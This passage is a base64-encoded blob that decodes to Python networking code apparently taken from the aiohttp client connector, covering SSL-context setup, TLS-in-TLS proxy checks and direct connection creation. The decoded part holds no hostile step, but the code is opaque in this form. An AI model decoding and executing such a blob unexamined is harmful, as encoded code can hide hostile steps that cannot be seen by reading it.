lbnRzW2tleV0uc2V0KClcclxuICAgICAgICAgICAgZXhjZXB0IEJhc2VFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICMgYW55IEROUyBleGNlcHRpb24sIGluZGVwZW5kZW50bHkgb2YgdGhlIGltcGxlbWVudGF0aW9uXHJcbiAgICAgICAgICAgICAgICAjIGlzIHNldCBmb3IgdGhlIHdhaXRlcnMgdG8gcmFpc2UgdGhlIHNhbWUgZXhjZXB0aW9uLlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fdGhyb3R0bGVfZG5zX2V2ZW50c1trZXldLnNldChleGM9ZSlcclxuICAgICAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl90aHJvdHRsZV9kbnNfZXZlbnRzLnBvcChrZXkpXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jYWNoZWRfaG9zdHMubmV4dF9hZGRycyhrZXkpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9jcmVhdGVfY29ubmVjdGlvbihcclxuICAgICAgICBzZWxmLCByZXE6ICJDbGllbnRSZXF1ZXN0IiwgdHJhY2VzOiBMaXN0WyJUcmFjZSJdLCB0aW1lb3V0OiAiQ2xpZW50VGltZW91dCJcclxuICAgICkgLT4gUmVzcG9uc2VIYW5kbGVyOlxyXG4gICAgICAgICIiIkNyZWF0ZSBjb25uZWN0aW9uLlxyXG5cclxuICAgICAgICBIYXMgc2FtZSBrZXl3b3JkIGFyZ3VtZW50cyBhcyBCYXNlRXZlbnRMb29wLmNyZWF0ZV9jb25uZWN0aW9uLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIHJlcS5wcm94eTpcclxuICAgICAgICAgICAgXywgcHJvdG8gPSBhd2FpdCBzZWxmLl9jcmVhdGVfcHJveHlfY29ubmVjdGlvbihyZXEsIHRyYWNlcywgdGltZW91dClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBfLCBwcm90byA9IGF3YWl0IHNlbGYuX2NyZWF0ZV9kaXJlY3RfY29ubmVjdGlvbihyZXEsIHRyYWNlcywgdGltZW91dClcclxuXHJcbiAgICAgICAgcmV0dXJuIHByb3RvXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgQGZ1bmN0b29scy5scnVfY2FjaGUoTm9uZSlcclxuICAgIGRlZiBfbWFrZV9zc2xfY29udGV4dCh2ZXJpZmllZDogYm9vbCkgLT4gU1NMQ29udGV4dDpcclxuICAgICAgICBpZiB2ZXJpZmllZDpcclxuICAgICAgICAgICAgcmV0dXJuIHNzbC5jcmVhdGVfZGVmYXVsdF9jb250ZXh0KClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzc2xjb250ZXh0ID0gc3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1RMU19DTElFTlQpXHJcbiAgICAgICAgICAgIHNzbGNvbnRleHQub3B0aW9ucyB8PSBzc2wuT1BfTk9fU1NMdjJcclxuICAgICAgICAgICAgc3NsY29udGV4dC5vcHRpb25zIHw9IHNzbC5PUF9OT19TU0x2M1xyXG4gICAgICAgICAgICBzc2xjb250ZXh0LmNoZWNrX2hvc3RuYW1lID0gRmFsc2VcclxuICAgICAgICAgICAgc3NsY29udGV4dC52ZXJpZnlfbW9kZSA9IHNzbC5DRVJUX05PTkVcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgc3NsY29udGV4dC5vcHRpb25zIHw9IHNzbC5PUF9OT19DT01QUkVTU0lPTlxyXG4gICAgICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3IgYXMgYXR0cl9lcnI6XHJcbiAgICAgICAgICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAgICAgICAgICJ7IXN9OiBUaGUgUHl0aG9uIGludGVycHJldGVyIGlzIGNvbXBpbGVkICJcclxuICAgICAgICAgICAgICAgICAgICAiYWdhaW5zdCBPcGVuU1NMIDwgMS4wLjAuIFJlZjogIlxyXG4gICAgICAgICAgICAgICAgICAgICJodHRwczovL2RvY3MucHl0aG9uLm9yZy8zL2xpYnJhcnkvc3NsLmh0bWwiXHJcbiAgICAgICAgICAgICAgICAgICAgIiNzc2wuT1BfTk9fQ09NUFJFU1NJT04iLmZvcm1hdChhdHRyX2VyciksXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHNzbGNvbnRleHQuc2V0X2RlZmF1bHRfdmVyaWZ5X3BhdGhzKClcclxuICAgICAgICAgICAgcmV0dXJuIHNzbGNvbnRleHRcclxuXHJcbiAgICBkZWYgX2dldF9zc2xfY29udGV4dChzZWxmLCByZXE6ICJDbGllbnRSZXF1ZXN0IikgLT4gT3B0aW9uYWxbU1NMQ29udGV4dF06XHJcbiAgICAgICAgIiIiTG9naWMgdG8gZ2V0IHRoZSBjb3JyZWN0IFNTTCBjb250ZXh0XHJcblxyXG4gICAgICAgIDAuIGlmIHJlcS5zc2wgaXMgZmFsc2UsIHJldHVybiBOb25lXHJcblxyXG4gICAgICAgIDEuIGlmIHNzbF9jb250ZXh0IGlzIHNwZWNpZmllZCBpbiByZXEsIHVzZSBpdFxyXG4gICAgICAgIDIuIGlmIF9zc2xfY29udGV4dCBpcyBzcGVjaWZpZWQgaW4gc2VsZiwgdXNlIGl0XHJcbiAgICAgICAgMy4gb3RoZXJ3aXNlOlxyXG4gICAgICAgICAgICAxLiBpZiB2ZXJpZnlfc3NsIGlzIG5vdCBzcGVjaWZpZWQgaW4gcmVxLCB1c2Ugc2VsZi5zc2xfY29udGV4dFxyXG4gICAgICAgICAgICAgICAod2lsbCBnZW5lcmF0ZSBhIGRlZmF1bHQgY29udGV4dCBhY2NvcmRpbmcgdG8gc2VsZi52ZXJpZnlfc3NsKVxyXG4gICAgICAgICAgICAyLiBpZiB2ZXJpZnlfc3NsIGlzIFRydWUgaW4gcmVxLCBnZW5lcmF0ZSBhIGRlZmF1bHQgU1NMIGNvbnRleHRcclxuICAgICAgICAgICAgMy4gaWYgdmVyaWZ5X3NzbCBpcyBGYWxzZSBpbiByZXEsIGdlbmVyYXRlIGEgU1NMIGNvbnRleHQgdGhhdFxyXG4gICAgICAgICAgICAgICB3b25cJ3QgdmVyaWZ5XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgcmVxLmlzX3NzbCgpOlxyXG4gICAgICAgICAgICBpZiBzc2wgaXMgTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJTU0wgaXMgbm90IHN1cHBvcnRlZC4iKVxyXG4gICAgICAgICAgICBzc2xjb250ZXh0ID0gcmVxLnNzbFxyXG4gICAgICAgICAgICBpZiBpc2luc3RhbmNlKHNzbGNvbnRleHQsIHNzbC5TU0xDb250ZXh0KTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBzc2xjb250ZXh0XHJcbiAgICAgICAgICAgIGlmIHNzbGNvbnRleHQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAjIG5vdCB2ZXJpZmllZCBvciBmaW5nZXJwcmludGVkXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gc2VsZi5fbWFrZV9zc2xfY29udGV4dChGYWxzZSlcclxuICAgICAgICAgICAgc3NsY29udGV4dCA9IHNlbGYuX3NzbFxyXG4gICAgICAgICAgICBpZiBpc2luc3RhbmNlKHNzbGNvbnRleHQsIHNzbC5TU0xDb250ZXh0KTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBzc2xjb250ZXh0XHJcbiAgICAgICAgICAgIGlmIHNzbGNvbnRleHQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAjIG5vdCB2ZXJpZmllZCBvciBmaW5nZXJwcmludGVkXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gc2VsZi5fbWFrZV9zc2xfY29udGV4dChGYWxzZSlcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX21ha2Vfc3NsX2NvbnRleHQoVHJ1ZSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgIGRlZiBfZ2V0X2ZpbmdlcnByaW50KHNlbGYsIHJlcTogIkNsaWVudFJlcXVlc3QiKSAtPiBPcHRpb25hbFsiRmluZ2VycHJpbnQiXTpcclxuICAgICAgICByZXQgPSByZXEuc3NsXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShyZXQsIEZpbmdlcnByaW50KTpcclxuICAgICAgICAgICAgcmV0dXJuIHJldFxyXG4gICAgICAgIHJldCA9IHNlbGYuX3NzbFxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UocmV0LCBGaW5nZXJwcmludCk6XHJcbiAgICAgICAgICAgIHJldHVybiByZXRcclxuICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgIGFzeW5jIGRlZiBfd3JhcF9jcmVhdGVfY29ubmVjdGlvbihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICphcmdzOiBBbnksXHJcbiAgICAgICAgcmVxOiAiQ2xpZW50UmVxdWVzdCIsXHJcbiAgICAgICAgdGltZW91dDogIkNsaWVudFRpbWVvdXQiLFxyXG4gICAgICAgIGNsaWVudF9lcnJvcjogVHlwZVtFeGNlcHRpb25dID0gQ2xpZW50Q29ubmVjdG9yRXJyb3IsXHJcbiAgICAgICAgKiprd2FyZ3M6IEFueSxcclxuICAgICkgLT4gVHVwbGVbYXN5bmNpby5UcmFuc3BvcnQsIFJlc3BvbnNlSGFuZGxlcl06XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIGNlaWxfdGltZW91dCh0aW1lb3V0LnNvY2tfY29ubmVjdCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fbG9vcC5jcmVhdGVfY29ubmVjdGlvbigqYXJncywgKiprd2FyZ3MpICAjIHR5cGU6IGlnbm9yZVtyZXR1cm4tdmFsdWVdICAjIG5vcWFcclxuICAgICAgICBleGNlcHQgY2VydF9lcnJvcnMgYXMgZXhjOlxyXG4gICAgICAgICAgICByYWlzZSBDbGllbnRDb25uZWN0b3JDZXJ0aWZpY2F0ZUVycm9yKHJlcS5jb25uZWN0aW9uX2tleSwgZXhjKSBmcm9tIGV4Y1xyXG4gICAgICAgIGV4Y2VwdCBzc2xfZXJyb3JzIGFzIGV4YzpcclxuICAgICAgICAgICAgcmFpc2UgQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IocmVxLmNvbm5lY3Rpb25fa2V5LCBleGMpIGZyb20gZXhjXHJcbiAgICAgICAgZXhjZXB0IE9TRXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICByYWlzZSBjbGllbnRfZXJyb3IocmVxLmNvbm5lY3Rpb25fa2V5LCBleGMpIGZyb20gZXhjXHJcblxyXG4gICAgZGVmIF9mYWlsX29uX25vX3N0YXJ0X3RscyhzZWxmLCByZXE6ICJDbGllbnRSZXF1ZXN0IikgLT4gTm9uZTpcclxuICAgICAgICAiIiJSYWlzZSBhIDpweTpleGM6YFJ1bnRpbWVFcnJvcmAgb24gbWlzc2luZyBgYHN0YXJ0X3RscygpYGAuXHJcblxyXG4gICAgICAgIE9uZSBjYXNlIGlzIHRoYXQgOnB5Om1ldGg6YGFzeW5jaW8ubG9vcC5zdGFydF90bHNgIGlzIG5vdCB5ZXRcclxuICAgICAgICBpbXBsZW1lbnRlZCB1bmRlciBQeXRob24gMy42LiBJdCBpcyBuZWNlc3NhcnkgZm9yIFRMUy1pbi1UTFMgc29cclxuICAgICAgICB0aGF0IGl0IGlzIHBvc3NpYmxlIHRvIHNlbmQgSFRUUFMgcXVlcmllcyB0aHJvdWdoIEhUVFBTIHByb3hpZXMuXHJcblxyXG4gICAgICAgIFRoaXMgZG9lc25cJ3QgYWZmZWN0IHJlZ3VsYXIgSFRUUCByZXF1ZXN0cywgdGhvdWdoLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCByZXEuaXNfc3NsKCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBwcm94eV91cmwgPSByZXEucHJveHlcclxuICAgICAgICBhc3NlcnQgcHJveHlfdXJsIGlzIG5vdCBOb25lXHJcbiAgICAgICAgaWYgcHJveHlfdXJsLnNjaGVtZSAhPSAiaHR0cHMiOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VsZi5fY2hlY2tfbG9vcF9mb3Jfc3RhcnRfdGxzKClcclxuXHJcbiAgICBkZWYgX2NoZWNrX2xvb3BfZm9yX3N0YXJ0X3RscyhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgc2VsZi5fbG9vcC5zdGFydF90bHNcclxuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3IgYXMgYXR0cl9leGM6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJBbiBIVFRQUyByZXF1ZXN0IGlzIGJlaW5nIHNlbnQgdGhyb3VnaCBhbiBIVFRQUyBwcm94eS4gIlxyXG4gICAgICAgICAgICAgICAgIlRoaXMgbmVlZHMgc3VwcG9ydCBmb3IgVExTIGluIFRMUyBidXQgaXQgaXMgbm90IGltcGxlbWVudGVkICJcclxuICAgICAgICAgICAgICAgICJpbiB5b3VyIHJ1bnRpbWUgZm9yIHRoZSBzdGRsaWIgYXN5bmNpby5cXG5cXG4iXHJcbiAgICAgICAgICAgICAgICAiUGxlYXNlIHVwZ3JhZGUgdG8gUHl0aG9uIDMuNyBvciBoaWdoZXIuIEZvciBtb3JlIGRldGFpbHMsICJcclxuICAgICAgICAgICAgICAgICJwbGVhc2Ugc2VlOlxcbiJcclxuICAgICAgICAgICAgICAgICIqIGh0dHBzOi8vYnVncy5weXRob24ub3JnL2lzc3VlMzcxNzlcXG4iXHJcbiAgICAgICAgICAgICAgICAiKiBodHRwczovL2dpdGh1Yi5jb20vcHl0aG9uL2NweXRob24vcHVsbC8yODA3M1xcbiJcclxuICAgICAgICAgICAgICAgICIqIGh0dHBzOi8vZG9jcy5haW9odHRwLm9yZy9lbi9zdGFibGUvIlxyXG4gICAgICAgICAgICAgICAgImNsaWVudF9hZHZhbmNlZC5odG1sI3Byb3h5LXN1cHBvcnRcXG4iXHJcbiAgICAgICAgICAgICAgICAiKiBodHRwczovL2dpdGh1Yi5jb20vYWlvLWxpYnMvYWlvaHR0cC9kaXNjdXNzaW9ucy82MDQ0XFxuIixcclxuICAgICAgICAgICAgKSBmcm9tIGF0dHJfZXhjXHJcblxyXG4gICAgZGVmIF9sb29wX3N1cHBvcnRzX3N0YXJ0X3RscyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgc2VsZi5fY2hlY2tfbG9vcF9mb3Jfc3RhcnRfdGxzKClcclxuICAgICAgICBleGNlcHQgUnVudGltZUVycm9yOlxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG5cclxuICAgIGRlZiBfd2Fybl9hYm91dF90bHNfaW5fdGxzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdW5kZXJseWluZ190cmFuc3BvcnQ6IGFzeW5jaW8uVHJhbnNwb3J0LFxyXG4gICAgICAgIHJlcTogIkNsaWVudFJlcXVlc3QiLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICIiIklzc3VlIGEgd2FybmluZyBpZiB0aGUgcmVxdWVzdGVkIFVSTCBoYXMgSFRUUFMgc2NoZW1lLiIiIlxyXG4gICAgICAgIGlmIHJlcS5yZXF1ZXN0X2luZm8udXJsLnNjaGVtZSAhPSAiaHR0cHMiOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgYXN5bmNpb19zdXBwb3J0c190bHNfaW5fdGxzID0gZ2V0YXR0cihcclxuICAgICAgICAgICAgdW5kZXJseWluZ190cmFuc3BvcnQsXHJcbiAgICAgICAgICAgICJfc3RhcnRfdGxzX2NvbXBhdGlibGUiLFxyXG4gICAgICAgICAgICBGYWxzZSxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIGFzeW5jaW9fc3VwcG9ydHNfdGxzX2luX3RsczpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJBbiBIVFRQUyByZXF1ZXN0IGlzIGJlaW5nIHNlbnQgdGhyb3VnaCBhbiBIVFRQUyBwcm94eS4gIlxyXG4gICAgICAgICAgICAiVGhpcyBzdXBwb3J0IGZvciBUTFMgaW4gVExTIGlzIGtub3duIHRvIGJlIGRpc2FibGVkICJcclxuICAgICAgICAgICAgImluIHRoZSBzdGRsaWIgYXN5bmNpby4gVGhpcyBpcyB3aHkgeW91XCdsbCBwcm9iYWJseSBzZWUgIlxyXG4gICAgICAgICAgICAiYW4gZXJyb3IgaW4gdGhlIGxvZyBiZWxvdy5cXG5cXG4iXHJcbiAgICAgICAgICAgICJJdCBpcyBwb3NzaWJsZSB0byBlbmFibGUgaXQgdmlhIG1vbmtleXBhdGNoaW5nIHVuZGVyICJcclxuICAgICAgICAgICAgIlB5dGhvbiAzLjcgb3IgaGlnaGVyLiBGb3IgbW9yZSBkZXRhaWxzLCBzZWU6XFxuIlxyXG4gICAgICAgICAgICAiKiBodHRwczovL2J1Z3MucHl0aG9uLm9yZy9pc3N1ZTM3MTc5XFxuIlxyXG4gICAgICAgICAgICAiKiBodHRwczovL2dpdGh1Yi5jb20vcHl0aG9uL2NweXRob24vcHVsbC8yODA3M1xcblxcbiJcclxuICAgICAgICAgICAgIllvdSBjYW4gdGVtcG9yYXJpbHkgcGF0Y2ggdGhpcyBhcyBmb2xsb3dzOlxcbiJcclxuICAgICAgICAgICAgIiogaHR0cHM6Ly9kb2NzLmFpb2h0dHAub3JnL2VuL3N0YWJsZS9jbGllbnRfYWR2YW5jZWQuaHRtbCNwcm94eS1zdXBwb3J0XFxuIlxyXG4gICAgICAgICAgICAiKiBodHRwczovL2dpdGh1Yi5jb20vYWlvLWxpYnMvYWlvaHR0cC9kaXNjdXNzaW9ucy82MDQ0XFxuIixcclxuICAgICAgICAgICAgUnVudGltZVdhcm5pbmcsXHJcbiAgICAgICAgICAgIHNvdXJjZT1zZWxmLFxyXG4gICAgICAgICAgICAjIFdoeSBgNGA/IEF0IGxlYXN0IDMgb2YgdGhlIGNhbGxzIGluIHRoZSBzdGFjayBvcmlnaW5hdGVcclxuICAgICAgICAgICAgIyBmcm9tIHRoZSBtZXRob2RzIGluIHRoaXMgY2xhc3MuXHJcbiAgICAgICAgICAgIHN0YWNrbGV2ZWw9MyxcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIF9zdGFydF90bHNfY29ubmVjdGlvbihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHVuZGVybHlpbmdfdHJhbnNwb3J0OiBhc3luY2lvLlRyYW5zcG9ydCxcclxuICAgICAgICByZXE6ICJDbGllbnRSZXF1ZXN0IixcclxuICAgICAgICB0aW1lb3V0OiAiQ2xpZW50VGltZW91dCIsXHJcbiAgICAgICAgY2xpZW50X2Vycm9yOiBUeXBlW0V4Y2VwdGlvbl0gPSBDbGllbnRDb25uZWN0b3JFcnJvcixcclxuICAgICkgLT4gVHVwbGVbYXN5bmNpby5CYXNlVHJhbnNwb3J0LCBSZXNwb25zZUhhbmRsZXJdOlxyXG4gICAgICAgICIiIldyYXAgdGhlIHJhdyBUQ1AgdHJhbnNwb3J0IHdpdGggVExTLiIiIlxyXG4gICAgICAgIHRsc19wcm90byA9IHNlbGYuX2ZhY3RvcnkoKSAgIyBDcmVhdGUgYSBicmFuZCBuZXcgcHJvdG8gZm9yIFRMU1xyXG5cclxuICAgICAgICAjIFNhZmV0eSBvZiB0aGUgYGNhc3QoKWAgY2FsbCBoZXJlIGlzIGJhc2VkIG9uIHRoZSBmYWN0IHRoYXRcclxuICAgICAgICAjIGludGVybmFsbHkgYF9nZXRfc3NsX2NvbnRleHQoKWAgb25seSByZXR1cm5zIGBOb25lYCB3aGVuXHJcbiAgICAgICAgIyBgcmVxLmlzX3NzbCgpYCBldmFsdWF0ZXMgdG8gYEZhbHNlYCB3aGljaCBpcyBuZXZlciBnb25uYSBoYXBwZW5cclxuICAgICAgICAjIGluIHRoaXMgY29kZSBwYXRoLiBPZiBjb3Vyc2UsIGl0XCdzIHJhdGhlciBmcmFnaWxlXHJcbiAgICAgICAgIyBtYWludGFpbmFiaWxpdHktd2lzZSBidXQgdGhpcyBpcyB0byBiZSBzb2x2ZWQgc2VwYXJhdGVseS5cclxuICAgICAgICBzc2xjb250ZXh0ID0gY2FzdChzc2wuU1NMQ29udGV4dCwgc2VsZi5fZ2V0X3NzbF9jb250ZXh0KHJlcSkpXHJcblxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgYXN5bmMgd2l0aCBjZWlsX3RpbWVvdXQodGltZW91dC5zb2NrX2Nvbm5lY3QpOlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIHRsc190cmFuc3BvcnQgPSBhd2FpdCBzZWxmLl9sb29wLnN0YXJ0X3RscyhcclxuICAgICAgICAgICAgICAgICAgICAgICAgdW5kZXJseWluZ190cmFuc3BvcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRsc19wcm90byxcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3NsY29udGV4dCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VydmVyX2hvc3RuYW1lPXJlcS5ob3N0LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzc2xfaGFuZHNoYWtlX3RpbWVvdXQ9dGltZW91dC50b3RhbCxcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgQmFzZUV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgICAgICAgICAjIFdlIG5lZWQgdG8gY2xvc2UgdGhlIHVuZGVybHlpbmcgdHJhbnNwb3J0IHNpbmNlXHJcbiAgICAgICAgICAgICAgICAgICAgIyBgc3RhcnRfdGxzKClgIHByb2JhYmx5IGZhaWxlZCBiZWZvcmUgaXQgaGFkIGFcclxuICAgICAgICAgICAgICAgICAgICAjIGNoYW5jZSB0byBkbyB0aGlzOlxyXG4gICAgICAgICAgICAgICAgICAgIHVuZGVybHlpbmdfdHJhbnNwb3J0LmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICByYWlzZVxyXG4gICAgICAgIGV4Y2VwdCBjZXJ0X2Vycm9ycyBhcyBleGM6XHJcbiAgICAgICAgICAgIHJhaXNlIENsaWVudENvbm5lY3RvckNlcnRpZmljYXRlRXJyb3IocmVxLmNvbm5lY3Rpb25fa2V5LCBleGMpIGZyb20gZXhjXHJcbiAgICAgICAgZXhjZXB0IHNzbF9lcnJvcnMgYXMgZXhjOlxyXG4gICAgICAgICAgICByYWlzZSBDbGllbnRDb25uZWN0b3JTU0xFcnJvcihyZXEuY29ubmVjdGlvbl9rZXksIGV4YykgZnJvbSBleGNcclxuICAgICAgICBleGNlcHQgT1NFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgIHJhaXNlIGNsaWVudF9lcnJvcihyZXEuY29ubmVjdGlvbl9rZXksIGV4YykgZnJvbSBleGNcclxuICAgICAgICBleGNlcHQgVHlwZUVycm9yIGFzIHR5cGVfZXJyOlxyXG4gICAgICAgICAgICAjIEV4YW1wbGUgY2F1c2UgbG9va3MgbGlrZSB0aGlzOlxyXG4gICAgICAgICAgICAjIFR5cGVFcnJvcjogdHJhbnNwb3J0IDxhc3luY2lvLnNzbHByb3RvLl9TU0xQcm90b2NvbFRyYW5zcG9ydFxyXG4gICAgICAgICAgICAjIG9iamVjdCBhdCAweDdmNzYwNjE1ZTQ2MD4gaXMgbm90IHN1cHBvcnRlZCBieSBzdGFydF90bHMoKVxyXG5cclxuICAgICAgICAgICAgcmFpc2UgQ2xpZW50Q29ubmVjdGlvbkVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkNhbm5vdCBpbml0aWFsaXplIGEgVExTLWluLVRMUyBjb25uZWN0aW9uIHRvIGhvc3QgIlxyXG4gICAgICAgICAgICAgICAgZiJ7cmVxLmhvc3Qhc306e3JlcS5wb3J0OmR9IHRocm91Z2ggYW4gdW5kZXJseWluZyBjb25uZWN0aW9uICJcclxuICAgICAgICAgICAgICAgIGYidG8gYW4gSFRUUFMgcHJveHkge3JlcS5wcm94eSFzfSBzc2w6e3JlcS5zc2wgb3IgXCdkZWZhdWx0XCd9ICJcclxuICAgICAgICAgICAgICAgIGYiW3t0eXBlX2VyciFzfV0iXHJcbiAgICAgICAgICAgICkgZnJvbSB0eXBlX2VyclxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHRsc19wcm90by5jb25uZWN0aW9uX21hZGUoXHJcbiAgICAgICAgICAgICAgICB0bHNfdHJhbnNwb3J0XHJcbiAgICAgICAgICAgICkgICMgS2ljayB0aGUgc3RhdGUgbWFjaGluZSBvZiB0aGUgbmV3IFRMUyBwcm90b2NvbFxyXG5cclxuICAgICAgICByZXR1cm4gdGxzX3RyYW5zcG9ydCwgdGxzX3Byb3RvXHJcblxyXG4gICAgYXN5bmMgZGVmIF9jcmVhdGVfZGlyZWN0X2Nvbm5lY3Rpb24oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICByZXE6ICJDbGllbnRSZXF1ZXN0IixcclxuICAgICAgICB0cmFjZXM6IExpc3RbIlRyYWNlIl0sXHJcbiAgICAgICAgdGltZW91dDogIkNsaWVudFRpbWVvdXQiLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgY2xpZW50X2Vycm9yOiBUeXBlW0V4Y2VwdGlvbl0gPSBDbGllbnRDb25uZWN0b3JFcnJvcixcclxuICAgICkgLT4gVHVwbGVbYXN5bmNpby5UcmFuc3BvcnQsIFJlc3BvbnNlSGFuZGxlcl06XHJcbiAgICAgICAgc3NsY29udGV4dCA9IHNlbGYuX2dldF9zc2xfY29udGV4dChyZXEpXHJcbiAgICAgICAgZmluZ2VycHJpbnQgPSBzZWxmLl9nZXRfZmluZ2VycHJpbnQocmVxKVxyXG5cclxuICAgICAgICBob3N0ID0gcmVxLnVybC5yYXdfaG9zdFxyXG4gICAgICAgIGFzc2VydCBob3N0IGlzIG5vdCBOb25lXHJcbiAgICAgICAgcG9ydCA9IHJlcS5wb3J0XHJcbiAgICAgICAgYXNzZXJ0IHBvcnQgaXMgbm90IE5vbmVcclxuICAgICAgICBob3N0X3Jlc29sdmVkID0gYXN5bmNpby5lbnN1cmVfZnV0dXJlKFxyXG4gICAgICAgICAgICBzZWxmLl9yZXNvbHZlX2hvc3QoaG9zdCwgcG9ydCwgdHJhY2VzPXRyYWNlcyksIGxvb3A9c2VsZi5fbG9vcFxyXG4gICAgICAgIClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICMgQ2FuY2VsbGluZyB0aGlzIGxvb2t1cCBzaG91bGQgbm90IGNhbmNlbCB0aGUgdW5kZXJseWluZyBsb29rdXBcclxuICAgICAgICAgICAgIyAgb3IgZWxzZSB0aGUgY2FuY2VsIGV2ZW50IHdpbGwgZ2V0IGJyb2FkY2FzdCB0byBhbGwgdGhlIHdhaXRlcnNcclxuICAgICAgICAgICAgIyAgYWNyb3NzIGFsbCBjb25uZWN0aW9ucy5cclxuICAgICAgICAgICAgaG9zdHMgPSBhd2FpdCBhc3luY2lvLnNoaWVsZChob3N0X3Jlc29sdmVkKVxyXG4gICAgICAgIGV4Y2VwdCBhc3luY2lvLkNhbmNlbGxlZEVycm9yOlxyXG5cclxuICAgICAgICAgICAgZGVmIGRyb3BfZXhjZXB0aW9uKGZ1dDogImFzeW5jaW8uRnV0dXJlW0xpc3RbRGljdFtzdHIsIEFueV1dXSIpIC0+IE5vbmU6XHJcbiAgICAgICAgICAgICAgICB3aXRoIHN1cHByZXNzKEV4Y2VwdGlvbiwgYXN5bmNpby5DYW5jZWxsZWRFcnJvcik6XHJcbiAgICAgICAgICAgICAgICAgICAgZnV0LnJlc3VsdCgpXHJcblxyXG4gICAgICAgICAgICBob3N0X3Jlc29sdmVkLmFkZF9kb25lX2NhbGxiYWNrKGRyb3BfZXhjZXB0aW9uKVxyXG4gICAgICAgICAgICByYWlzZVxyXG4gICAgICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGV4YzpcclxuICAgICAgICAgICAgIyBpbiBjYXNlIG9mIHByb3h5IGl0IGlzIG5vdCBDbGllbnRQcm94eUNvbm5lY3Rpb25FcnJvclxyXG4gICAgICAgICAgICAjIGl0IGlzIHByb2JsZW0gb2YgcmVzb2x2aW5nIHByb3h5IGlwIGl0c2VsZlxyXG4gICAgICAgICAgICByYWlzZSBDbGllbnRDb25uZWN0b3JFcnJvcihyZXEuY29ubmVjdGlvbl9rZXksIGV4YykgZnJvbSBleGNcclxuXHJcbiAgICAgICAgbGFzdF9leGMgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0V4Y2VwdGlvbl1cclxuXHJcbiAgICAgICAgZm9yIGhpbmZvIGluIGhvc3RzOlxyXG4gICAgICAgICAgICBob3N0ID0gaGluZm9bImhvc3QiXVxyXG4gI